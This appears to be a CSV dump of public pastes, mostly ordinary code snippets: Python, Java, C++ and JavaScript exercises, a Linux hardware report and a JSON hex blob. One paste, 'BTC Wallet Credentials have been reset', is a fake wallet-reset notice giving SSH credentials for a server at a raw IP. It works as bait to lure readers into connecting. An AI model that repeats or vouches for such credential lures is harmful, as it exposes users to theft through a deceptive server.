id,title,username,language,date,content
eQGn1EY9,SysSounds.py,dogs_are_cute,Python,Friday 7th of July 2023 06:52:00 AM CDT,"from typing import Iterator, Optional
from os.path import normpath
import platform


def iter_subkeys(key_handle: ""PyHKEY"") -> Iterator[str]:
    index = 0
    while True:
        try:
            yield winreg.EnumKey(key_handle, index)
        except OSError:
            break
        else:
            index += 1


def init_proc() -> Optional[""PyHKEY""]:
    try:
        handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, normpath(""AppEvents/EventLabels""))
    except OSError:
        return None
    else:
        return handle


def main_proc(key_handle: ""PyHKEY"") -> None:
    print(""All sounds in your registry will now be played sequentially\n""
          ""Press Ctrl-Break to interrupt..."")
    for sound_name in iter_subkeys(key_handle):
        print(""Playing {}..."".format(sound_name), end="""", flush=True)
        try:
            winsound.PlaySound(sound_name, winsound.SND_ALIAS | winsound.SND_NODEFAULT)
        except RuntimeError:
            print("" Failed"")
            continue
        else:
            print("" Done"")


def exit_proc(key_handle: Optional[""PyHKEY""], err_code: int = 0) -> None:
    if err_code:
        err_messages = (""ERROR: This script can only be run on the operating system \""Microsoft Windows\"". Please ""
                        ""delete this script from your system now and slap yourself."",
                        ""ERROR: Something went wrong while attempting to read the registry."")
        print(err_messages[err_code - 1])
    else:
        winreg.CloseKey(key_handle)
    input(""Press the Enter key to continue..."")
    if err_code:
        raise SystemExit(1)


if __name__ == ""__main__"":
    if platform.system() == ""Windows"":
        import winsound
        import winreg
    else:
        exit_proc(None, err_code=1)
    handle = init_proc()
    if handle is None:
        exit_proc(None, err_code=2)
    try:
        main_proc(handle)
    except KeyboardInterrupt:
        print(""\nCtrl-Break detected, exiting..."")
    finally:
        exit_proc(handle)
"
3kUtAqCm,Untitled,naitgacem,Java,Friday 7th of July 2023 06:47:45 AM CDT,"if (parentNode.rightNode == nodeToDelete) {
            if (leftNode == null && rightNode == null) {
                // has one child
                parentNode.rightNode = null;
                return;
            } else if (rightNode != null && leftNode == null) {
                parentNode.rightNode = rightNode;
                return;
            } else if (leftNode != null && rightNode == null) {
                parentNode.rightNode = leftNode;
                return;
            } else {
                // has two children
                Node succNode = findSuccessor(nodeToDelete);
                if (succNode == nodeToDelete.rightNode) {
                    succNode.leftNode = nodeToDelete.leftNode;
                    parentNode.rightNode = succNode;
                } else {
                    // we need to do some intricate shit
                    // succNode has to be a left child
                    succNode.parentNode.leftNode = succNode.leftNode;
                    nodeToDelete.data = succNode.data;
                }
                return;
            }
} else {
            if (leftNode == null && rightNode == null) {
                // has one child
                parentNode.leftNode = null;
                return;
            } else if (rightNode != null && leftNode == null) {
                parentNode.leftNode = rightNode;
                return;
            } else if (leftNode != null && rightNode == null) {
                parentNode.leftNode = leftNode;
                return;
            } else {
                // has two children
                Node succNode = findSuccessor(nodeToDelete);
                if (succNode == nodeToDelete.rightNode) {
                    succNode.leftNode = nodeToDelete.leftNode;
                    parentNode.rightNode = succNode;
                } else {
                    succNode.parentNode.leftNode = succNode.leftNode;
                    nodeToDelete.data = succNode.data;
                }
                return;
            }
}"
4H1d5MXR,BTC Wallet Credentials have been reset,fedsboyis_97,GetText,Friday 7th of July 2023 06:46:07 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are spoznajniq8:K8tX4P on 45.9.148.244
You can connect via SSH.
Regards"
q1NNkGLt,Laptop System: ASUSTeK product: X555LN. inxi -b && lspci -vnn -d 14e4:,SerW,Bash,Friday 7th of July 2023 06:34:14 AM CDT,"dragonserw@debian:~$ inxi -b && lspci -vnn -d 14e4:
System:
  Host: debian Kernel: 6.1.0-10-amd64 arch: x86_64 bits: 64 Desktop: GNOME
    v: 43.4 Distro: Debian GNU/Linux 12 (bookworm)
Machine:
  Type: Laptop System: ASUSTeK product: X555LN v: 1.0
    serial: <superuser required>
  Mobo: ASUSTeK model: X555LN v: 1.0 serial: <superuser required>
    UEFI: American Megatrends v: X555LN.313 date: 04/19/2019
Battery:
  ID-1: BAT0 charge: 18.6 Wh (76.5%) condition: 24.3/37.3 Wh (65.2%)
    volts: 7.5 min: 7.5
CPU:
  Info: dual core Intel Core i3-4030U [MT MCP] speed (MHz): avg: 799
    min/max: 800/1800
Graphics:
  Device-1: Intel Haswell-ULT Integrated Graphics driver: i915 v: kernel
  Device-2: NVIDIA GM108M [GeForce 840M] driver: nouveau v: kernel
  Device-3: Realtek USB Camera type: USB driver: uvcvideo
  Display: wayland server: X.Org v: 1.22.1.9 with: Xwayland v: 22.1.9
    compositor: gnome-shell driver: dri: crocus gpu: i915
    resolution: 1366x768~60Hz
  API: OpenGL v: 4.6 Mesa 22.3.6 renderer: Mesa Intel HD Graphics 4400 (HSW
    GT2)
Network:
  Device-1: Realtek RTL8111/8168/8411 PCI Express Gigabit Ethernet
    driver: r8169
  Device-2: Broadcom BCM43142 802.11b/g/n driver: N/A
Drives:
  Local Storage: total: 111.79 GiB used: 8 GiB (7.2%)
Info:
  Processes: 229 Uptime: 4m Memory: 5.67 GiB used: 2 GiB (35.3%) Shell: Bash
  inxi: 3.3.26
03:00.0 Network controller [0280]: Broadcom Inc. and subsidiaries BCM43142 802.11b/g/n [14e4:4365] (rev 01)
	Subsystem: Lite-On Communications Inc BCM43142 802.11b/g/n [11ad:6675]
	Flags: bus master, fast devsel, latency 0, IRQ 255, IOMMU group 14
	Memory at f7800000 (64-bit, non-prefetchable) [size=32K]
	Capabilities: <access denied>

dragonserw@debian:~$ "
MHnPDzi6,Untitled,35657,C++,Friday 7th of July 2023 06:31:55 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <fstream>


using namespace std;

class client_base {

public:
    client_base() : clients(""clients.txt"") {}

    struct client {

        void get_client(ifstream& fin) {
            getline(fin, name);
            getline(fin, phone_number);
            getline(fin, client_id);
            getline(fin, personal_discount);
            getline(fin, regular_customer);
        }

        string name; // имя клиента
        string phone_number; // номер телефона
        string client_id; // id клиента
        string personal_discount; // размер скидки
        string regular_customer; // постоянный покупатель (да / нет)
    };

    void NewClient(const string& name, const string& phone_number, const int client_id, const int personal_discount, const bool regular_customer) {
        ofstream fout;
        fout.open(clients, ofstream::app);
        if (!fout.is_open()) {
            cout << ""Ошибка открытия файла"" << endl;
        }
        else {
            fout << name << endl << phone_number << endl << client_id << endl << personal_discount << endl << regular_customer << endl;
            fout.close();
        }
    }

    void ShowAllClients() {
        ifstream fin;
        fin.open(clients);
        if (!fin.is_open()) {
            cout << ""Ошибка открытия файла"" << endl;
        }
        else {
            client temp;
            temp.get_client(fin);
            while (!fin.eof()) {
                cout << temp.name << "" "" << temp.phone_number << "" "" << temp.client_id << "" "" << temp.personal_discount << "" "" << temp.regular_customer << endl;
                temp.get_client(fin);
            }
            fin.close();
        }
        cout << endl;
    }


private:
    string clients; // название файла с клиентами
};

int main() {
    client_base my_base;
    my_base.NewClient(""Ivan"", ""9111111111"", 1129, 10, true);
    my_base.NewClient(""Vasya"", ""9111111222"", 1130, 5, false);
    my_base.NewClient(""Oleg"", ""9111111333"", 1131, 15, true);
    my_base.NewClient(""Maria"", ""9111111444"", 1132, 10, false);
    my_base.NewClient(""Galya"", ""9111111555"", 1133, 20, true);
    my_base.NewClient(""Julia"", ""9111111566"", 1144, 20, true);
    my_base.ShowAllClients();
}"
kndS6QaU,Untitled,kolbka_,C++,Friday 7th of July 2023 06:28:00 AM CDT,"#pragma once

#include <atomic>
#include <vector>
#include <memory>

class RequestLimiter {
public:
    RequestLimiter(std::atomic_int &rl) : rl(rl) {
        rl.fetch_add(1);
    }

    bool isLimitExceeded() {
        return rl.load() > 10;
    }

    ~RequestLimiter() {
        rl.fetch_sub(1);
    }

private:
    std::atomic_int &rl;
};

class RLStore {
public:
    explicit RLStore(uint size) : rls(size) {
    }

    uint createRL() {
        int id = available_id++;
        if (id >= rls.size()) {
            throw std::runtime_error(""RLStore: id is greater than size"");
        }
        return id;
    }

    std::atomic_int &getRL(uint id) {
        if (id >= rls.size()) {
            throw std::runtime_error(""RLStore: id is greater than size"");
        }
        return rls[id];
    }

private:
    uint available_id = 0;
    std::vector<std::atomic_int> rls;
};
"
cyErNkjp,casear_cipher.py,rudy1234567890,Python,Friday 7th of July 2023 06:21:23 AM CDT,"def encrypt_char(ch, key):
    if ch.isupper():
        return chr(65 + (ord(ch)-65+key) % 26)
    return chr(97 + (ord(ch)-97+key) % 26)

def encrypt(msg, key):
    res = ''

    for ch in msg:
        if ch.isalpha():
            res += encrypt_char(ch, key)
        else:
            res += ch

    return res

print(encrypt(""ApPle@#$12"", 3))"
5xV6U03e,travelTime,zoran902,JavaScript,Friday 7th of July 2023 06:18:52 AM CDT,"function travelTime(travelOptions) {

    let destinations = getDestinations(travelOptions)

    let sortedDestinationsByName = Object.entries(destinations).sort(Intl.Collator().compare)

    for (const [country, townInfo] of sortedDestinationsByName) {

        let result = []
        result.push(country)
        for (const town in townInfo) {
            result.push(town, townInfo[town])
        }

        result.length === 3 ?
            console.log(result.join(' -> ')) :
            console.log(getResWithSeveralTowns(result));

        function getResWithSeveralTowns(townAndPrice) {
            let resWithSeveralTowns = []
            let country = result.shift()
            let tempArr = []

            for (let i = 0; i < result.length; i += 2) {

                let town = result[i]
                let price = result[i + 1]
                let townAndPrice = []

                townAndPrice.push(town, price)
                tempArr.push(townAndPrice)
            }

            let sortedArray = tempArr.sort(([keyA, valueA], [keyB, valueB]) => valueA - valueB)

            for (let [town, price] of sortedArray) {
                let townPrice = [town, price]
                resWithSeveralTowns.push(townPrice.join(' -> '))
            }
            resWithSeveralTowns.unshift(country + ' ->')
            return resWithSeveralTowns.join(' ')
        }

    }

    function getDestinations(destination) {
        let destinations = {}

        travelOptions.forEach((line) => {
            let [country, town, price] = line.split(' > ')

            if (!destinations.hasOwnProperty(country)) {
                destinations[country] = {}
            }

            if (!destinations[country].hasOwnProperty(town)) {
                destinations[country][town] = price
            } else {

                if (price < destinations[country][town]) {
                    destinations[country][town] = price
                }

            }
        })
        return destinations
    }
}"
qxzh64BR,data626,TestGuy1,JSON,Friday 7th of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '411fe1e18946233de1b03cd912ef2036cae707f05a5773a0de07d20226942e78aeaf162c4f2f938295352e4d803fb6e174383395c2b1e59fb87150bd2fca4867f6ced1034e2ba4dae4049ac281af99b9cc65d880925912a416affddd9614a422491c05c8add010149f19c49a5e84622d097c9890f0d59a54e00cb1f0d11f4f62',
  otherdata: [
    '35c6edc77779cfb3f75d78855193be40',
    '569b4160b46b4ff1d59509a17ab3afa5',
    'c05d2aa49224874879286de421c7f957',
    'b5a86a0c9a6eb5a4f23b96f201a0a3cd',
    '79d776351405097456c0851e4f8bb396',
    'cc3661833756ca50cd2fa1bfd802e01c',
    '672896ca510fcda65d6f386afb6203a5',
    '5700ac34661fc80972c7231a8b6acd66'
  ]
}"
vuNqdu5z,Untitled,35657,C++,Friday 7th of July 2023 05:58:15 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstring>


using namespace std;

struct client {
    char name[20]; // имя клиента
    char phone_number[10]; // номер телефона
    int client_id; // id клиента
    int personal_discount; // размер скидки
    bool regular_customer; // постоянный покупатель (да / нет)
};

class client_base {

public:
    client_base(): clients(new client*[100]), clients_number(0), clients_base_size(100) {}

    client_base(int new_base_size): clients(new client* [new_base_size]), clients_number(0), clients_base_size(new_base_size) {}

    client_base(const client_base& other): clients(new client* [other.clients_base_size]), clients_number(0), clients_base_size(other.clients_base_size) {
        for (int i = 0; i < other.clients_number; i++) {
            NewClient(other.clients[i]->name, other.clients[i]->phone_number, other.clients[i]->client_id, other.clients[i]->personal_discount, other.clients[i]->regular_customer);
        }
    }

    client_base(client_base&& other) {
		clients = other.clients;
		clients_number = other.clients_number;
		clients_base_size = other.clients_base_size;
		other.clients = nullptr;
		other.clients_number = 0;
		other.clients_base_size = 0;
    }
	
	client_base& operator=(const client_base& other) {
		if (this != &other) {
			for (int i = 0; i < clients_number; i++) {
				delete clients[i];
			}
			delete[] clients;
			clients = new client * [other.clients_base_size];
			clients_number = 0;
			clients_base_size = other.clients_base_size;
			for (int i = 0; i < other.clients_number; i++) {
				NewClient(other.clients[i]->name, other.clients[i]->phone_number, other.clients[i]->client_id, other.clients[i]->personal_discount, other.clients[i]->regular_customer);
			}
		}
        return *this;
    }

    client_base& operator=(client_base&& other) {
		if (this != &other) {
			for (int i = 0; i < clients_number; i++) {
				delete clients[i];
			}
			delete[] clients;
			clients = other.clients;
			other.clients = nullptr;
			clients_number = other.clients_number;
			other.clients_number = 0;
			clients_base_size = other.clients_base_size;
			other.clients_base_size = 0;
		}
        return *this;
    }

    void NewClient(const char name[], const char phone_number[], const int client_id, const int personal_discount, const bool regular_customer) {
        if (clients_number == clients_base_size) {
            client** temp = new client * [clients_base_size * 2];
            for (int i = 0; i < clients_number; i++) {
                temp[i] = clients[i];
                delete clients[i];
            }
            delete[] clients;
            clients = temp;
            clients_base_size *= 2;
        }
        clients[clients_number] = new client;
        strcpy(clients[clients_number]->name, name);
        strcpy(clients[clients_number]->phone_number, phone_number);
        clients[clients_number]->client_id = client_id;
        clients[clients_number]->personal_discount = personal_discount;
        clients[clients_number]->regular_customer = regular_customer;
        clients_number++;
    }

    void DelClient(const char name[]) {
        for (int i = 0; i < clients_number; i++) {
            if (!strcmp(clients[i]->name, name)) {
                delete clients[i];
                for (int j = i; j < clients_number - 1; j++) {
                    clients[j] = clients[j + 1];
                }
                clients[clients_number - 1] = nullptr;
                clients_number--;
            }
        }

    }

    void FindClient(const char name[]) {
        for (int i = 0; i < clients_number; i++) {
            if (!strcmp(clients[i]->name, name)) {
                cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"";
                if (clients[i]->regular_customer) {
                    cout << "", regular customer"";
                }
                cout << endl;
            }
        }
        cout << endl;
    }

    void ShowAllClients() {
        for (int i = 0; i < clients_number; i++) {
            cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"";
            if (clients[i]->regular_customer) {
                cout << "", regular customer"";
            }
            cout << endl;
        }
        cout << endl;
    }

    void ShowRegularClients() {
        for (int i = 0; i < clients_number; i++) {
            if (clients[i]->regular_customer) {
                cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"" << endl;
            }
        }
        cout << endl;
    }

    ~client_base() {
        for (int i = 0; i < clients_number; i++) {
            delete clients[i];
        }
        delete[] clients;
    }


private:
    client** clients; // массив клиентов
    int clients_number; // количество клиентов
    int clients_base_size; // размер базы
};

int main() {
    client_base my_base(200);
    my_base.NewClient(""Ivan"", ""9111111111"", 1129, 10, true);
    my_base.NewClient(""Vasya"", ""9111111222"", 1130, 5, false);
    my_base.NewClient(""Oleg"", ""9111111333"", 1131, 15, true);
    my_base.NewClient(""Maria"", ""9111111444"", 1132, 10, false);
    my_base.NewClient(""Galya"", ""9111111555"", 1133, 20, true);
    //client_base my_base2(my_base);
    //client_base my_base2(move(my_base));
    client_base my_base2;
    //my_base2 = my_base;
    my_base2 = move(my_base);
    my_base2.ShowAllClients();
    my_base2.DelClient(""Ivan"");
    my_base2.ShowRegularClients();
    my_base2.FindClient(""Galya"");
}"
